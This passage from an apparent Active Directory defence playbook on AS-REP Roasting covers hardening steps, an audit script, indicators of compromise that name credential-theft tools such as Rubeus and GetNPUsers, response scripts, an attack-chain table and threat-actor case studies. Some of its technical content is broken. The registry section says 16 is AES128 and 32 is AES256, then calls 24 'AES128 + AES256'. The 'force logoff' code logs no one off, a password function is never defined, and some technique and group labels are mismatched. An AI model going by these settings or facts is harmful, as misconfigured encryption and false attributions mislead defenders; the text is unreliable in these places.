Add-ADFineGrainedPasswordPolicySubject -Identity "CriticalAccountPolicy" `
  -Subject "CN=Domain Admins,CN=Users,DC=domain,DC=local"
```

**Verification Command:**

```powershell
# Check password policy
Get-ADDefaultDomainPasswordPolicy | Select-Object MinPasswordLength, PasswordHistoryCount, MaxPasswordAge

# Expected output:
# MinPasswordLength: 25+
# PasswordHistoryCount: 12+
# MaxPasswordAge: 90 days
```

**Action 3: Migrate Legacy Applications to Managed Service Accounts (gMSA/dMSA)**

Applications with pre-auth-disabled accounts should be migrated to Group Managed Service Accounts (auto-rotating 120-char passwords) or dMSA (Server 2025).

**Applies To Versions:** Server 2012 R2+ (gMSA); Server 2025+ (dMSA)

**Manual Steps:**

```powershell
# Step 1: Create KDS Root Key (one-time per domain)
Add-KDSRootKey -EffectiveImmediately

# Step 2: Create gMSA
New-ADServiceAccount -Name "LegacyApp_gMSA" `
  -Description "Managed account for legacy application" `
  -Enabled $true

# Step 3: Assign computers that can use the account
Set-ADServiceAccount -Identity "LegacyApp_gMSA" `
  -PrincipalsAllowedToRetrieveManagedPassword "CN=LegacyAppServers,CN=Computers,DC=domain,DC=local"

# Step 4: On target server, install the gMSA
Install-ADServiceAccount -Identity "LegacyApp_gMSA"

# Step 5: Update application to use the gMSA (no password entry in config)
# Application service logon account: DOMAIN\LegacyApp_gMSA$
# Password: <leave blank; gMSA manages it>
```

**Verification:**

```powershell
# Verify gMSA is installed and healthy
Test-ADServiceAccount -Identity "LegacyApp_gMSA"

# Output should show: $true (healthy)
```

### Priority 2: HIGH

**Action 1: Enable Strong Encryption (AES) Only; Disable RC4**

RC4 is fast to crack. Enforcing AES-128/256 significantly increases cracking time.

**Applies To Versions:** Server 2008+

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Edit **Default Domain Policy**
3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
4. Find: **Network security: Configure encryption types allowed for Kerberos**
5. Set to: **AES128_HMAC_SHA1, AES256_HMAC_SHA1** (uncheck DES, RC4)
6. Click **Apply** → **OK**
7. Run `gpupdate /force`

**Or, via Registry (Server 2025):**

```powershell
# On Domain Controllers
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" `
  -Name "SupportedEncTypes" -Value 24 -Type DWord -Force

# Value meanings:
# 4   = RC4-HMAC
# 8   = (unused)
# 16  = AES128-CTS-HMAC-SHA1-96
# 32  = AES256-CTS-HMAC-SHA1-96
# 24  = AES128 + AES256 (recommended)
```

**Verification:**

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" `
  -Name "SupportedEncTypes"

# Expected: 24 (AES-only, secure)
```

**Action 2: Audit and Remove "Do Not Require Kerberos Pre-Authentication" Flag from All Accounts**

Regular audits catch newly misconfigured accounts.

**Applies To Versions:** Server 2008+

**PowerShell Audit Script (Run Monthly):**

```powershell
# Monthly audit report
$preAuthDisabled = Get-ADUser -Filter {userAccountControl -band 4194304} -Properties LastLogonDate, pwdLastSet, Description

if ($preAuthDisabled.Count -gt 0) {
    Write-Host "[WARNING] Found accounts with pre-auth disabled:" -ForegroundColor Yellow
    $preAuthDisabled | Select-Object sAMAccountName, LastLogonDate, @{N="PwdLastSet";E={$_.pwdLastSet}}, Description | Format-Table
    
    # Send alert email
    Send-MailMessage -To "security@domain.local" -Subject "ALERT: Pre-Auth Disabled Accounts" `
      -Body "Found $($preAuthDisabled.Count) accounts with pre-auth disabled. Review attached list." `
      -BodyAsHtml
} else {
    Write-Host "[OK] No accounts with pre-auth disabled"
}
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Windows\Temp\Rubeus.exe`, `GetNPUsers.py`, `Kerbrute*`
- `C:\Temp\asrep_hashes.txt`, `krb5asrep_*.txt`
- Hash files containing `$krb5asrep$`
- Crack result files (plaintext passwords)

**Registry:**
- Unusual entries in `HKEY_CURRENT_USER\Software\...` from service account logon

**Network:**
- Bulk Kerberos requests (port 88) to DC from non-DC source
- LDAP queries (port 389) for `userAccountControl:1.2.840.113556.1.4.803:=4194304`

**Event Log:**
- **Event ID 4768** with `PreAuthType=0` and `Status=0x0` (successful AS-REP)
- Bulk of 4768 events in short time window (5+ in 10 minutes for same user)
- 4768 events originating from unexpected IP addresses

### Response Procedures

#### 1. Isolate (Minutes 0-15)

**Immediate Actions:**

```powershell
# Disable all compromised accounts
Disable-ADAccount -Identity "compromised_user"

# Reset passwords for all pre-auth-disabled accounts
Get-ADUser -Filter {userAccountControl -band 4194304} | ForEach-Object {
    Set-ADAccountPassword -Identity $_ `
      -NewPassword (ConvertTo-SecureString -AsPlainText (GenerateComplexPassword 30) -Force) `
      -Reset
}

# Force logoff active sessions (if user account logged in)
Get-ADUser -Identity "compromised_user" | 
  Get-ADPrincipalGroupMembership | 
  ForEach-Object { Get-ADGroupMember $_ }
```

#### 2. Collect Evidence (Minutes 15-60)

**Export Logs:**

```powershell
# Export Event ID 4768 from last 48 hours
wevtutil epl Security "C:\Evidence\Security_4768_48h.evtx" `
  /q:"*[System[(EventID=4768) and TimeCreated[timediff(@SystemTime) <= 172800000]]]"

# Export with filter for vulnerable users
$vulnUsers = Get-ADUser -Filter {userAccountControl -band 4194304} -Properties sAMAccountName
foreach ($user in $vulnUsers) {
    wevtutil epl Security "C:\Evidence\$($user.sAMAccountName)_4768.evtx" `
      /q:"*[System[(EventID=4768) and TimeCreated[timediff(@SystemTime) <= 172800000]]] and EventData[Data[@Name='TargetUserName']='$($user.sAMAccountName)']"
}
```

#### 3. Remediate (Hours 1-4)

**Reset All Vulnerable Account Passwords:**

```powershell
# Reset passwords for all pre-auth-disabled accounts
$accounts = Get-ADUser -Filter {userAccountControl -band 4194304}

foreach ($account in $accounts) {
    $newPassword = GenerateComplexPassword 30  # 30-char random password
    Set-ADAccountPassword -Identity $account -NewPassword (ConvertTo-SecureString -AsPlainText $newPassword -Force) -Reset
    
    # Store password securely in password manager
    # Notify application owner to update configuration
}
```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [T1589 - Gather Victim Identity Information] | Enumerate usernames via OSINT, SMB NULL SESSION, or Kerbrute |
| **2** | **Enumeration** | [T1087.002 - Domain Account Discovery] | Identify pre-auth-disabled accounts via LDAP or Kerbrute |
| **3** | **Credential Access - Current** | **[CA-KERB-002: AS-REP Roasting]** | **Extract AS-REP hashes for vulnerable accounts** |
| **4** | **Credential Cracking** | [T1110 - Brute Force Password Guessing] | Crack hashes offline using Hashcat/John |
| **5** | **Lateral Movement** | [T1021.002 - Remote Services: SSH] or [T1021.001 - RDP] | Use compromised credentials to access systems |
| **6** | **Privilege Escalation** | [T1548.002 - Abuse Elevation Control] | Escalate from user to admin via compromised account |
| **7** | **Persistence** | [T1098 - Account Manipulation] | Modify account groups or create backdoor accounts |
| **8** | **Impact** | [T1565 - Data Destruction] or [T1657 - Data Exfiltration] | Ransomware deployment or data theft |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: FIN7 - Ransomware Lateral Movement Phase (2020-2025)

- **Target:** Fortune 500 organizations
- **Timeline:** Post-initial compromise (days 3-7)
- **Technique Status:** AS-REP Roasting used in mid-stage lateral movement
- **Attack Chain:**
  1. Initial access: Phishing → Cobalt Strike
  2. Reconnaissance: PowerView for pre-auth-disabled accounts
  3. **AS-REP Roasting: Rubeus to extract hashes for legacy service accounts**
  4. Offline cracking: GPU cluster (24-72 hours depending on password complexity)
  5. Lateral movement: Use cracked credentials to pivot to high-value systems
  6. Privilege escalation: Compromise Domain Admin accounts
  7. Ransomware deployment: Darkside/Black Basta across 100+ systems
- **Impact:** $20-50M+ ransom demands; critical business operations halted
- **Detection Gap:** Many organizations don't audit Event ID 4768 for PreAuthType=0; AS-REP extraction goes unnoticed
- **Reference:** [FIN7 Technical Analysis - Picus Security](https://www.picussecurity.com/resource/fin7-cybercrime-group-evolution)

#### Example 2: Conti Ransomware Group - Pre-Exploitation Reconnaissance (February 2021)

- **Target:** Critical infrastructure, healthcare
- **Timeline:** Reconnaissance phase (initial week)
- **Technique Status:** AS-REP Roasting as **primary credential source** before ransomware
- **Attack Chain:**
  1. Initial access: VPN compromise or phishing
  2. **Kerbrute enumeration: Discover pre-auth-disabled accounts without credentials**
  3. **AS-REP extraction: Rubeus/GetNPUsers for bulk hash extraction**
  4. Offline cracking: 3rd-party cracking service (5-day turnaround)
  5. Privilege escalation: Use cracked credentials + Kerberoasting for other accounts
  6. Persistence: Rogue admin creation + GPO modification
  7. Encryption: Ransomware deployment with persistence
- **Impact:** $10M+ ransom; critical operations offline for weeks
- **Detection Gap:** As-REP extraction performed on external network (no DC logs); no local activity
- **Reference:** [Conti Ransomware Analysis - Red Canary](https://redcanary.com/blog/threat-detection/conti-ransomware-group/)

#### Example 3: Wizard Spider (Carbon Spider) - Ongoing Campaigns (2024-2025)

- **Target:** Manufacturing, financial services, healthcare
- **Timeline:** Current active threat
- **Technique Status:** AS-REP Roasting still **highly effective** despite awareness
- **Attack Chain:**
  1. Initial access: RDP compromise or phishing
  2. Enumeration: Rapid PowerShell-based discovery of pre-auth-disabled accounts
  3. **AS-REP extraction: Rubeus on compromised workstation (stays in memory)**
  4. Offline cracking: Distributed across multiple systems (hours vs. days)
  5. Lateral movement: Compromised accounts for horizontal privilege escalation
  6. Persistence: Scheduled tasks under compromised account names
- **Impact:** BEC fraud, ransomware-as-service deployment, credential sale on darkweb
- **Detection:** Organizations with proper pre-auth enforcement + strong password policies are **protected**; others remain vulnerable
- **Reference:** [Wizard Spider - IBM Threat Intel Report 2024](https://www.ibm.com/reports/threat-intelligence)

---